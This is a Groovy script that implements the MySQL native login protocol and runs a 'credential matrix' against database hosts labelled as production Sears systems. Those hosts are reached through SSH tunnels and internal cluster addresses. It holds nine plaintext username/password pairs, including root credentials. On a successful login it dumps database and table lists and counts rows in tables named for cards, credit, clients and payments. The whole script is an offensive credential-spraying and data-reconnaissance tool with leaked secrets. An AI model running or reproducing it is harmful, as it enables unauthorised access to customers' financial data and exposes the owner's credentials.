import java.net.Socket
import java.net.InetSocketAddress
import java.security.MessageDigest

// ==== MySQL Native Protocol Client ====
class Cur2 {
  byte[] d; int i = 0
  long lenenc() {
    int b = d[i] & 0xFF; i++
    if (b < 0xFB) return (long) b
    if (b == 0xFC) { long v = (d[i] & 0xFF) | ((d[i+1] & 0xFF) << 8); i += 2; return v }
    if (b == 0xFD) { long v = (d[i] & 0xFF) | ((d[i+1] & 0xFF) << 8) | ((d[i+2] & 0xFF) << 16); i += 3; return v }
    long v = 0; for (int k = 0; k < 8; k++) { v |= ((long)(d[i+k] & 0xFF)) << (8*k) }; i += 8; return v
  }
  String lenstr() {
    int fb = d[i] & 0xFF
    if (fb == 0xFB) { i++; return null }
    long l = lenenc()
    String s = new String(d, i, (int)l, 'UTF-8'); i += (int)l; return s
  }
}

class MC2 {
  DataInputStream ins; BufferedOutputStream outs; Socket sock
  byte[] readPacket() {
    int len = (ins.readUnsignedByte()) | (ins.readUnsignedByte() << 8) | (ins.readUnsignedByte() << 16)
    ins.readUnsignedByte()
    byte[] pl = new byte[len]; ins.readFully(pl); return pl
  }
  void writePacket(int seq, byte[] pl) {
    int len = pl.length
    outs.write(len & 0xFF); outs.write((len >> 8) & 0xFF); outs.write((len >> 16) & 0xFF); outs.write(seq & 0xFF)
    outs.write(pl); outs.flush()
  }
  String connectAndAuth(String host, int port, String user, String pass) {
    try {
      sock = new Socket(); sock.connect(new InetSocketAddress(host, port), 5000); sock.setSoTimeout(12000)
      ins = new DataInputStream(new BufferedInputStream(sock.getInputStream()))
      outs = new BufferedOutputStream(sock.getOutputStream())
      byte[] p = readPacket()
      if ((p[0] & 0xFF) != 10) return "BAD_PROTO"
      // parse server greeting
      int i = 1
      StringBuilder sb = new StringBuilder()
      while (p[i] != 0) { sb.append((char)(p[i] & 0xFF)); i++ }
      String version = sb.toString(); i++
      i += 4
      byte[] salt1 = new byte[8]; System.arraycopy(p, i, salt1, 0, 8); i += 8
      i++; i += 2; i++; i += 2; i += 2
      int authLen = (p[i] & 0xFF); i++; i += 10
      int salt2Len = Math.max(13, authLen - 8)
      def salt2List = []
      int avail = p.length - i
      for (int k = 0; k < Math.min(salt2Len, avail); k++) { if (p[i+k] != 0) salt2List.add(p[i+k]) }
      byte[] seed = new byte[8 + salt2List.size()]
      System.arraycopy(salt1, 0, seed, 0, 8)
      for (int k = 0; k < salt2List.size(); k++) seed[8+k] = (byte)salt2List[k]
      def md = MessageDigest.getInstance('SHA-1')
      byte[] s1 = md.digest(pass.getBytes('UTF-8'))
      byte[] s2 = md.digest(s1)
      md.reset(); md.update(seed); md.update(s2)
      byte[] s3 = md.digest()
      byte[] token = new byte[20]
      for (int j = 0; j < 20; j++) token[j] = (byte)((s1[j] ^ s3[j]) & 0xFF)
      int caps = 0x1 | 0x200 | 0x2000 | 0x8000 | 0x80000 | 0x20000
      ByteArrayOutputStream baos = new ByteArrayOutputStream()
      baos.write(caps & 0xFF); baos.write((caps >> 8) & 0xFF); baos.write((caps >> 16) & 0xFF); baos.write((caps >> 24) & 0xFF)
      baos.write(0); baos.write(0); baos.write(0); baos.write(1); baos.write(33); baos.write(new byte[23])
      baos.write(user.getBytes('UTF-8')); baos.write(0)
      baos.write(token.length); baos.write(token)
      baos.write('mysql_native_password'.getBytes('UTF-8')); baos.write(0)
      writePacket(1, baos.toByteArray())
      byte[] ap = readPacket()
      int at = ap[0] & 0xFF
      if (at == 0xFF) {
        int code = (ap[1] & 0xFF) | ((ap[2] & 0xFF) << 8)
        return "AUTH_ERR_" + code + ": " + new String(ap, 3, ap.length - 3, 'UTF-8')
      }
      return "AUTH_OK:MySQL_" + version
    } catch (Exception e) {
      return "CONNECT_ERR: " + e.getMessage()
    }
  }
  String query(String q) {
    try {
      ByteArrayOutputStream qb = new ByteArrayOutputStream()
      qb.write(0x03); qb.write(q.getBytes('UTF-8'))
      writePacket(0, qb.toByteArray())
      byte[] rp = readPacket()
      int b0 = rp[0] & 0xFF
      if (b0 == 0xFF) { int code = (rp[1] & 0xFF) | ((rp[2] & 0xFF) << 8); return "ERR " + code + ": " + new String(rp, 3, rp.length - 3, 'UTF-8') }
      if (b0 == 0x00) return "OK"
      Cur2 c0 = new Cur2(d: rp)
      long colCount = c0.lenenc()
      def colNames = []
      for (int ci = 0; ci < colCount; ci++) { byte[] cp = readPacket(); Cur2 cc = new Cur2(d: cp); for (int skip = 0; skip < 4; skip++) { cc.lenstr() }; colNames.add(cc.lenstr()) }
      readPacket()
      def rows = []
      int guard = 0
      while (guard++ < 300) {
        byte[] rp2 = readPacket()
        int rb = rp2[0] & 0xFF
        if (rb == 0xFE && rp2.length < 9) break
        if (rb == 0xFF) { rows.add(["ROWERR"]); break }
        Cur2 rc = new Cur2(d: rp2)
        def vals = []
        for (int ci = 0; ci < colCount; ci++) { def v = rc.lenstr(); vals.add(v == null ? "NULL" : v.take(200)) }
        rows.add(vals)
      }
      StringBuilder res = new StringBuilder()
      res.append("COLS[" + colNames.join("|") + "]")
      rows.each { res.append("\n  ROW[" + it.join("|") + "]") }
      return res.toString()
    } catch (Exception e) { return "QUERY_ERR: " + e.getMessage() }
  }
  void closeConn() { try { sock?.close() } catch (Exception ignored) {} }
}

// ==== CREDENTIAL MATRIX ====
def targets = [
  [host: '127.0.0.1', port: 13308, label: 'SSH_TUNNEL_127:13308→dbasears:3308'],
  [host: '127.0.0.1', port: 13307, label: 'SSH_TUNNEL_127:13307→3307'],
  [host: '127.0.0.1', port: 13306, label: 'SSH_TUNNEL_127:13306→3306'],
  [host: '172.27.141.6', port: 3308, label: 'CLUSTER_NODE1_172.27.141.6:3308'],
  [host: '172.27.140.143', port: 3308, label: 'CLUSTER_NODE2_172.27.140.143:3308'],
  [host: '172.27.141.6', port: 3306, label: 'CLUSTER_NODE1_172.27.141.6:3306'],
]

def creds = [
  [user: 'dbcronproductos', pass: '0c1A0ZW0Kh#wjqdRHV$b63A'],
  [user: 'dbsmartinsight',  pass: 'CD49uwg*iG9m5d+y'],
  [user: 'app_t1',          pass: 'jpTSf99UzLxC#t>'],
  [user: 'app_t1',          pass: 'pySY8}7>ftpPz9S'],
  [user: 'app_t1',          pass: 'wUt22Us2CUh#+M='],
  [user: 'root',            pass: 'JenkisLegasy25'],
  [user: 'root',            pass: 'auroraboreal00'],
  [user: 'root',            pass: ''],
  [user: 'adaxxidb',        pass: 'JTQ6PrkecY3y1kVN'],
]

println "=== PROD SEARS MYSQL AUTH MATRIX ==="

def successes = []

targets.each { tgt ->
  println "\n--- TARGET: ${tgt.label} ---"
  boolean connected = false
  creds.each { cr ->
    if (connected) return
    def mc = new MC2()
    def r = mc.connectAndAuth(tgt.host, tgt.port, cr.user, cr.pass)
    println "  ${cr.user}@${tgt.host}:${tgt.port} → ${r}"
    if (r.startsWith('AUTH_OK')) {
      connected = true
      successes.add([tgt: tgt, cr: cr, mc: mc, ver: r])
      // === DUMP DATABASES ===
      println "\n  *** AUTH SUCCESS! Dumping databases... ***"
      println "  DATABASES: " + mc.query("SHOW DATABASES")
      println "  GRANTS: " + mc.query("SHOW GRANTS FOR CURRENT_USER()")
      
      // Check key databases
      def dbsResult = mc.query("SHOW DATABASES")
      def dbList = []
      dbsResult.eachLine { line ->
        if (line.contains("ROW[")) {
          def m = line =~ /ROW\[([^\]]+)\]/
          if (m) dbList.add(m[0][1])
        }
      }
      dbList.each { db ->
        if (db.toLowerCase() in ['information_schema', 'performance_schema', 'sys', 'mysql']) return
        println "\n  === DB: $db ==="
        println "  " + mc.query("SHOW TABLES FROM `${db}`")
        // Count rows in suspicious tables
        def tablesResult = mc.query("SHOW TABLES FROM `${db}`")
        tablesResult.eachLine { tline ->
          if (tline.contains("ROW[")) {
            def tm = tline =~ /ROW\[([^\]]+)\]/
            if (tm) {
              def tableName = tm[0][1]
              if (tableName.toLowerCase() =~ /pedido|tarjeta|card|cliente|credit|cuenta|pago|factura|dato|transac/) {
                println "  COUNT(${db}.${tableName}): " + mc.query("SELECT COUNT(*) FROM `${db}`.`${tableName}`")
              }
            }
          }
        }
      }
      mc.closeConn()
    } else if (r.startsWith('CONNECT_ERR')) {
      // Skip remaining creds if can't connect
      mc.closeConn()
      return
    } else {
      mc.closeConn()
    }
  }
}

println "\n\n=== SUMMARY ==="
if (successes.isEmpty()) {
  println "NO AUTH SUCCESS on any target/credential combination"
  println "Checking port reachability..."
  targets.each { tgt ->
    try {
      def s = new Socket()
      s.connect(new InetSocketAddress(tgt.host, tgt.port), 3000)
      println "PORT OPEN: ${tgt.label}"
      s.close()
    } catch (Exception e) {
      println "PORT CLOSED/FILTERED: ${tgt.label} (${e.getMessage()})"
    }
  }
} else {
  println "SUCCESS on:"
  successes.each { s -> println "  ${s.cr.user}@${s.tgt.host}:${s.tgt.port}" }
}

println "=== FIN ==="
